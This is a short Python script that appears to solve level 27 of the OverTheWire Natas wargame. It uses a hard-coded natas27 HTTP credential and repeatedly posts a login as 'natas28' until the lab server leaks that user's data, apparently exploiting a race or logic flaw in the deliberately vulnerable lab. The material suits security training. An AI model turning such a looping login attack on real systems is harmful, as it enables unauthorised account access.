import requests
from requests.auth import HTTPBasicAuth

def build_url(user,passwrd): return "http://natas27.natas.labs.overthewire.org/?username="+user+"&password=" + passwrd

def is_success():
        resp = requests.post(build_url("natas28","AAAAA"), auth=HTTPBasicAuth('natas27','55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ'))
        if ("Here is your data:" in resp.text):
                print resp.text
                return True
        else:
                return False
i=0
while(1):
        i += 1
        if (i%20 == 0):
                print i
        if is_success():
                break
